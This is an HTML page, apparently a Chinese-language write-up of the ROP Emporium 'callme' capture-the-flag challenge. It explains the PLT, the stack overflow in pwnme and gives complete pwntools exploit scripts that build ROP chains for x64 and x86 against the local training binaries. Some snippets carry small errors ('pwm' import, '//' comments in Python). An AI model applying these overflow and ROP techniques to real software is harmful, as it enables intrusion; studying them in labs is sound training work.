@@ -1,0 +1,367 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="zh-CN" >
+<head>
+  <meta charset="utf-8" /><meta name="generator" content="Docutils 0.17.1: http://docutils.sourceforge.net/" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>callme &mdash; rop emporium writeup  文档</title>
+      <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
+      <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
+  <!--[if lt IE 9]>
+    <script src="../_static/js/html5shiv.min.js"></script>
+  <![endif]-->
+  
+        <script data-url_root="../" id="documentation_options" src="../_static/documentation_options.js"></script>
+        <script src="../_static/jquery.js"></script>
+        <script src="../_static/underscore.js"></script>
+        <script src="../_static/doctools.js"></script>
+        <script src="../_static/translations.js"></script>
+    <script src="../_static/js/theme.js"></script>
+    <link rel="index" title="索引" href="../genindex.html" />
+    <link rel="search" title="搜索" href="../search.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+            <a href="../index.html" class="icon icon-home"> rop emporium writeup
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
+    <input type="text" name="q" placeholder="在文档中搜索" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <!-- Local TOC -->
+              <div class="local-toc"><ul>
+<li><a class="reference internal" href="#">callme</a><ul>
+<li><a class="reference internal" href="#failure-is-not-an-option">Failure is not an option</a></li>
+<li><a class="reference internal" href="#procedure-linkage">Procedure Linkage</a></li>
+<li><a class="reference internal" href="#correct-order">Correct order</a></li>
+<li><a class="reference internal" href="#x64">x64</a></li>
+<li><a class="reference internal" href="#x86">x86</a></li>
+</ul>
+</li>
+</ul>
+</div>
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../index.html">rop emporium writeup</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../index.html" class="icon icon-home"></a> &raquo;</li>
+      <li>callme</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../_sources/2_callme/README.md.txt" rel="nofollow"> 查看页面源码</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="callme">
+<h1>callme<a class="headerlink" href="#callme" title="永久链接至标题"></a></h1>
+<p>via：https://ropemporium.com/challenge/callme.html</p>
+<p>Reliably make consecutive calls to imported functions. Use some new techniques and learn about the Procedure Linkage Table.
+Click below to download the binary.</p>
+<p><a class="reference external" href="https://ropemporium.com/binary/callme.zip">64bit</a> <a class="reference external" href="https://ropemporium.com/binary/callme32.zip">32bit</a></p>
+<section id="failure-is-not-an-option">
+<h2>Failure is not an option<a class="headerlink" href="#failure-is-not-an-option" title="永久链接至标题"></a></h2>
+<p>How do you make consecutive calls to a function from your ROP chain that won’t crash afterwards? If you keep using the call instructions already present in the binary your chains will eventually fail, especially when exploiting 32 bit binaries. Consider why this might be the case.</p>
+</section>
+<section id="procedure-linkage">
+<h2>Procedure Linkage<a class="headerlink" href="#procedure-linkage" title="永久链接至标题"></a></h2>
+<p>The Procedure Linkage Table (PLT) is used to resolve function addresses in imported libraries at runtime, it’s worth reading up about it. See appendix A in the <a class="reference external" href="https://ropemporium.com/guide.html">beginner’s guide</a> for a brief explanation of how the PLT is used in lazy binding. Even better, go ahead and step through the lazy linking process in a debugger, it’s important you understand what resides at the addresses reported to you by commands like ·<code class="docutils literal notranslate"><span class="pre">rabin2</span> <span class="pre">-i</span> <span class="pre">&lt;binary&gt;</span></code> and <code class="docutils literal notranslate"><span class="pre">rabin2</span> <span class="pre">-R</span> <span class="pre">&lt;binary&gt;</span></code></p>
+</section>
+<section id="correct-order">
+<h2>Correct order<a class="headerlink" href="#correct-order" title="永久链接至标题"></a></h2>
+<p>Important:
+To dispose of the need for any RE we’ll tell you the following:
+You must call <strong>callme_one(), callme_two()</strong> and <strong>callme_three()</strong> in that order, each with the arguments 1,2,3 e.g. <strong>callme_one(1,2,3)</strong> to print the flag. The solution here is simple enough, use your knowledge about what resides in the PLT to call the callme_ functions in the above order and with the correct arguments. <em>Don’t get distracted by the incorrect calls to these functions made in the binary, they’re there to ensure these functions get linked. You can also ignore the .dat files and the encrypted flag in this challenge, they’re there to ensure the functions must be called in the correct order.</em></p>
+</section>
+<section id="x64">
+<h2>x64<a class="headerlink" href="#x64" title="永久链接至标题"></a></h2>
+<p>看到上面的要求</p>
+<p>You must call <strong>callme_one(), callme_two()</strong> and <strong>callme_three()</strong> in that order, each with the arguments 1,2,3 e.g. <strong>callme_one(1,2,3)</strong> to print the flag</p>
+<p>需要依次调用 <code class="docutils literal notranslate"><span class="pre">callme_one</span></code> <code class="docutils literal notranslate"><span class="pre">callme_two</span></code> <code class="docutils literal notranslate"><span class="pre">callme_three</span></code></p>
+<p>并且这三个函数调用时需要传入 1 2 3 当参数</p>
+<p><img alt="image-20200430144744588" src="../_images/image-20200430144744588.png" /></p>
+<p>其实这个题目可以是一道逆向题，我看了一下 <code class="docutils literal notranslate"><span class="pre">libcallme.so</span></code> 里面 <code class="docutils literal notranslate"><span class="pre">callme_one</span></code> <code class="docutils literal notranslate"><span class="pre">callme_two</span></code> <code class="docutils literal notranslate"><span class="pre">callme_three</span></code> 函数的定义，其实就是对 <code class="docutils literal notranslate"><span class="pre">flag</span></code> 的解密而已（异或），但是这是道 <code class="docutils literal notranslate"><span class="pre">pwn</span></code> 题。正常情况下我们是拿不到  <code class="docutils literal notranslate"><span class="pre">libcallme.so</span></code> 的，所以我们还是要按照题目要求依次调用上面那三个函数</p>
+<p><img alt="image-20200430145233868" src="../_images/image-20200430145233868.png" /></p>
+<p>漏洞点：<code class="docutils literal notranslate"><span class="pre">pwnme</span></code> 里面的 <code class="docutils literal notranslate"><span class="pre">fgets</span></code></p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>        00401a3c 48 8b 15        MOV        RDX,qword ptr [stdin]
+                 4d 06 20 00
+        00401a43 48 8d 45 e0     LEA        RAX=&gt;local_28,[RBP + -0x20]
+        00401a47 be 00 01        MOV        ESI,0x100
+                 00 00
+        00401a4c 48 89 c7        MOV        RDI,RAX
+        00401a4f e8 ec fd        CALL       fgets                      
+</pre></div>
+</div>
+<p><code class="docutils literal notranslate"><span class="pre">buffer</span></code> 位于 <code class="docutils literal notranslate"><span class="pre">[RBP</span> <span class="pre">+</span> <span class="pre">-0x20]</span></code></p>
+<p>填充 <code class="docutils literal notranslate"><span class="pre">0x20</span> <span class="pre">+</span> <span class="pre">0x8</span> <span class="pre">=</span> <span class="pre">0x28</span></code></p>
+<p>因为是 <code class="docutils literal notranslate"><span class="pre">x64</span></code> 需要 <code class="docutils literal notranslate"><span class="pre">gadget</span></code>  来构造 <code class="docutils literal notranslate"><span class="pre">ROP</span></code> 链</p>
+<p>调用 <code class="docutils literal notranslate"><span class="pre">callme_</span></code> 函数需要 <code class="docutils literal notranslate"><span class="pre">3</span></code> 个参数，也就是说需要 <code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">rdi</span></code> <code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">rsi</span></code> <code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">rdx</span></code></p>
+<p>直接用 <code class="docutils literal notranslate"><span class="pre">ROPgadget</span></code></p>
+<p><img alt="image-20200430150930487" src="../_images/image-20200430150930487.png" /></p>
+<p>有一条是</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="mh">0x0000000000401ab0</span> <span class="p">:</span> <span class="n">pop</span> <span class="n">rdi</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rsi</span> <span class="p">;</span> <span class="n">pop</span> <span class="n">rdx</span> <span class="p">;</span> <span class="n">ret</span>
+</pre></div>
+</div>
+<p>直接有 <code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">rdi</span></code> <code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">rsi</span></code> <code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">rdx</span></code> 免去了一个一个 <code class="docutils literal notranslate"><span class="pre">pop</span> <span class="pre">reg;</span> <span class="pre">ret</span></code> 拼接</p>
+<p>地址：<code class="docutils literal notranslate"><span class="pre">0x0000000000401ab0</span></code></p>
+<p>现在需要拿  <code class="docutils literal notranslate"><span class="pre">callme_one</span></code> <code class="docutils literal notranslate"><span class="pre">callme_two</span></code> <code class="docutils literal notranslate"><span class="pre">callme_three</span></code> 的 <code class="docutils literal notranslate"><span class="pre">plt</span></code></p>
+<p>用 <code class="docutils literal notranslate"><span class="pre">pwntools</span></code> 的 <code class="docutils literal notranslate"><span class="pre">ELF</span></code> 类中的 <code class="docutils literal notranslate"><span class="pre">plt</span></code> 方法（或者说函数，其实一样）这个方法返回的是一个 <code class="docutils literal notranslate"><span class="pre">dict</span></code></p>
+<p><img alt="image-20200430153110286" src="../_images/image-20200430153110286.png" /></p>
+<p>我们只需要   <code class="docutils literal notranslate"><span class="pre">callme_one</span></code> <code class="docutils literal notranslate"><span class="pre">callme_two</span></code> <code class="docutils literal notranslate"><span class="pre">callme_three</span></code> 的 <code class="docutils literal notranslate"><span class="pre">plt</span></code> ，操作如下</p>
+<p><img alt="image-20200430152825728" src="../_images/image-20200430152825728.png" /></p>
+<p>写 payload</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">callme_process</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./callme&quot;</span><span class="p">)</span>
+<span class="n">callme</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./callme&quot;</span><span class="p">)</span>
+<span class="n">callme_one_plt</span> <span class="o">=</span> <span class="n">callme</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;callme_one&quot;</span><span class="p">]</span>
+<span class="n">callme_two_plt</span> <span class="o">=</span> <span class="n">callme</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;callme_two&quot;</span><span class="p">]</span>
+<span class="n">callme_three_plt</span> <span class="o">=</span> <span class="n">callme</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;callme_three&quot;</span><span class="p">]</span>
+
+<span class="n">pop_rdi_rsi_rdx_ret</span> <span class="o">=</span> <span class="mh">0x0000000000401ab0</span>
+
+<span class="n">exp</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mh">0x28</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_rsi_rdx_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">callme_one_plt</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_rsi_rdx_ret</span><span class="p">)</span> <span class="o">//</span> <span class="n">覆盖</span> <span class="n">callme_one</span> <span class="n">的返回地址</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">callme_two_plt</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_rsi_rdx_ret</span><span class="p">)</span> <span class="o">//</span> <span class="n">覆盖</span> <span class="n">callme_two</span> <span class="n">的返回地址</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">callme_three_plt</span><span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">exp</span><span class="p">)</span>
+<span class="n">callme_process</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">callme_process</span><span class="o">.</span><span class="n">recvall</span><span class="p">())</span>
+<span class="n">callme_process</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+</div>
+<p>在这里我解释一下为什么</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_rsi_rdx_ret</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">callme_one_plt</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_rsi_rdx_ret</span><span class="p">)</span> <span class="o">//</span> <span class="n">callme_one</span> <span class="n">的返回地址</span>
+</pre></div>
+</div>
+<p>把返回地址覆盖成 <code class="docutils literal notranslate"><span class="pre">pop_rdi_rsi_rdx_ret</span></code> 调用 <code class="docutils literal notranslate"><span class="pre">callme_one</span></code> 后紧接着又覆盖上 <code class="docutils literal notranslate"><span class="pre">pop_rdi_rsi_rdx_ret</span></code></p>
+<p>x64 下调用函数布局这样的：</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">把参数压进寄存器</span>
+<span class="n">call</span> <span class="n">函数</span>
+<span class="n">被</span> <span class="n">call</span> <span class="n">函数的返回地址</span>
+</pre></div>
+</div>
+<p>所以其实是在覆盖 <code class="docutils literal notranslate"><span class="pre">callme_one</span></code> 的返回地址为调用  <code class="docutils literal notranslate"><span class="pre">callme_two</span></code> 做准备</p>
+<p><img alt="image-20200430154919204" src="../_images/image-20200430154919204.png" /></p>
+<p>pwn！</p>
+</section>
+<section id="x86">
+<h2>x86<a class="headerlink" href="#x86" title="永久链接至标题"></a></h2>
+<p>我就不复述上面的重复步骤了</p>
+<p>这是一篇 <code class="docutils literal notranslate"><span class="pre">phrack</span></code> 上面发布的关于 <code class="docutils literal notranslate"><span class="pre">x86</span> <span class="pre">rop</span></code> 的文章</p>
+<p>via：http://phrack.org/issues/58/4.html#article</p>
+<p><img alt="image-20200430163653493" src="../_images/image-20200430163653493.png" /></p>
+<div class="highlight-asm notranslate"><div class="highlight"><pre><span></span>        080487f8 68 00 01        PUSH       0x100
+                 00 00
+        080487fd 8d 45 d8        LEA        EAX=&gt;local_2c,[EBP + -0x28]
+        08048800 50              PUSH       EAX
+        08048801 e8 9a fd        CALL       fgets                       
+</pre></div>
+</div>
+<p><code class="docutils literal notranslate"><span class="pre">buffer</span></code> 位于：<code class="docutils literal notranslate"><span class="pre">[EBP</span> <span class="pre">+</span> <span class="pre">-0x28]</span></code></p>
+<p>填充：<code class="docutils literal notranslate"><span class="pre">0x28</span> <span class="pre">+</span> <span class="pre">0x4</span></code></p>
+<p>一样拿  <code class="docutils literal notranslate"><span class="pre">callme_one</span></code> <code class="docutils literal notranslate"><span class="pre">callme_two</span></code> <code class="docutils literal notranslate"><span class="pre">callme_three</span></code> 的 <code class="docutils literal notranslate"><span class="pre">plt</span></code></p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwm</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">callme32</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;callme32&quot;</span><span class="p">)</span>
+<span class="n">callme_one_plt</span> <span class="o">=</span> <span class="n">callme32</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;callme_one&quot;</span><span class="p">]</span>
+<span class="n">callme_two_plt</span> <span class="o">=</span> <span class="n">callme32</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;callme_two&quot;</span><span class="p">]</span>
+<span class="n">callme_three_plt</span> <span class="o">=</span> <span class="n">callme32</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;callme_three&quot;</span><span class="p">]</span>
+</pre></div>
+</div>
+<p>因为 <code class="docutils literal notranslate"><span class="pre">x86</span></code> 是通过在栈去传参的，所以，这里不需要 <code class="docutils literal notranslate"><span class="pre">gadget</span></code> ，只需要把参数放到栈上就好了</p>
+<p>完整的 exp：</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;tmux&quot;</span><span class="p">,</span> <span class="s2">&quot;split-window&quot;</span><span class="p">,</span> <span class="s2">&quot;-h&quot;</span><span class="p">]</span>
+<span class="n">callme32_process</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;callme32&quot;</span><span class="p">)</span>
+<span class="n">callme32</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;callme32&quot;</span><span class="p">)</span>
+<span class="n">callme_one_plt</span> <span class="o">=</span> <span class="n">callme32</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;callme_one&quot;</span><span class="p">]</span>
+<span class="n">callme_two_plt</span> <span class="o">=</span> <span class="n">callme32</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;callme_two&quot;</span><span class="p">]</span>
+<span class="n">callme_three_plt</span> <span class="o">=</span> <span class="n">callme32</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;callme_three&quot;</span><span class="p">]</span>
+<span class="n">pwnme</span> <span class="o">=</span> <span class="n">callme32</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;pwnme&quot;</span><span class="p">]</span>
+
+<span class="n">exp</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x28</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">callme_one_plt</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pwnme</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">callme32_process</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp</span><span class="p">)</span>
+
+
+<span class="n">exp0</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">44</span>
+<span class="n">exp0</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">callme_two_plt</span><span class="p">)</span>
+<span class="n">exp0</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pwnme</span><span class="p">)</span>
+<span class="n">exp0</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">exp0</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">exp0</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">callme32_process</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp0</span><span class="p">)</span>
+
+<span class="n">exp1</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">44</span>
+<span class="n">exp1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">callme_three_plt</span><span class="p">)</span>
+<span class="n">exp1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0xdead</span><span class="p">)</span>
+<span class="n">exp1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">exp1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">exp1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+<span class="n">callme32_process</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp1</span><span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">callme32_process</span><span class="o">.</span><span class="n">recvall</span><span class="p">())</span>
+<span class="n">callme32_process</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+</div>
+<p>其实这里程序的执行流程是：</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">pwnme</span><span class="p">(</span><span class="n">overflow</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">callme_one</span> <span class="o">-&gt;</span> <span class="n">pwnme</span><span class="p">(</span><span class="n">overflow</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">callme_two</span> <span class="o">-&gt;</span> <span class="n">pwnme</span><span class="p">(</span><span class="n">overflow</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">callme_three</span> <span class="o">-&gt;</span> <span class="mh">0xdeadbeef</span>
+</pre></div>
+</div>
+<p>我是使用了多次调用 <code class="docutils literal notranslate"><span class="pre">pwnme</span></code> ，每次调用都溢出那个 <code class="docutils literal notranslate"><span class="pre">buffer</span></code> 然后把返回地址覆盖成我想要调用的函数</p>
+<p>这是我用来完成下面步骤的 debug 版的 exp，其实就是用了 gdb attach 上去（<code class="docutils literal notranslate"><span class="pre">gdb.attach(callme32_pid)</span></code>），我用的是 docker 没有图形，我只能用 tmux 分屏（<code class="docutils literal notranslate"><span class="pre">context.terminal</span> <span class="pre">=</span> <span class="pre">[&quot;tmux&quot;,</span> <span class="pre">&quot;split-window&quot;,</span> <span class="pre">&quot;-h&quot;]</span></code>）</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&quot;tmux&quot;</span><span class="p">,</span> <span class="s2">&quot;split-window&quot;</span><span class="p">,</span> <span class="s2">&quot;-h&quot;</span><span class="p">]</span>
+<span class="n">callme32_process</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;callme32&quot;</span><span class="p">)</span>
+<span class="n">callme32_pid</span> <span class="o">=</span> <span class="n">pidof</span><span class="p">(</span><span class="n">callme32_process</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">callme32</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;callme32&quot;</span><span class="p">)</span>
+<span class="n">callme_one_plt</span> <span class="o">=</span> <span class="n">callme32</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;callme_one&quot;</span><span class="p">]</span>
+<span class="n">callme_two_plt</span> <span class="o">=</span> <span class="n">callme32</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;callme_two&quot;</span><span class="p">]</span>
+<span class="n">callme_three_plt</span> <span class="o">=</span> <span class="n">callme32</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s2">&quot;callme_three&quot;</span><span class="p">]</span>
+<span class="n">pwnme</span> <span class="o">=</span> <span class="n">callme32</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;pwnme&quot;</span><span class="p">]</span>
+
+<span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">callme32_pid</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x28</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">callme_one_plt</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pwnme</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+
+<span class="n">callme32_process</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp</span><span class="p">)</span>
+
+<span class="n">exp0</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">44</span>
+<span class="n">exp0</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">callme_two_plt</span><span class="p">)</span>
+<span class="n">exp0</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pwnme</span><span class="p">)</span>
+<span class="n">exp0</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">exp0</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">exp0</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+
+<span class="n">callme32_process</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp0</span><span class="p">)</span>
+
+<span class="n">exp1</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">44</span>
+<span class="n">exp1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">callme_three_plt</span><span class="p">)</span>
+<span class="n">exp1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x41414141</span><span class="p">)</span>
+<span class="n">exp1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">exp1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">exp1</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+
+<span class="n">callme32_process</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">exp1</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">callme32_process</span><span class="o">.</span><span class="n">recvall</span><span class="p">())</span>
+<span class="n">callme32_process</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</pre></div>
+</div>
+<p>可以看到（全程请看  DISASM 窗口）：</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="c1"># 第一次溢出</span>
+<span class="n">exp</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="mh">0x28</span> <span class="o">+</span> <span class="mh">0x4</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">callme_one_plt</span><span class="p">)</span>
+<span class="n">exp</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">pwnme</span><span class="p">)</span>
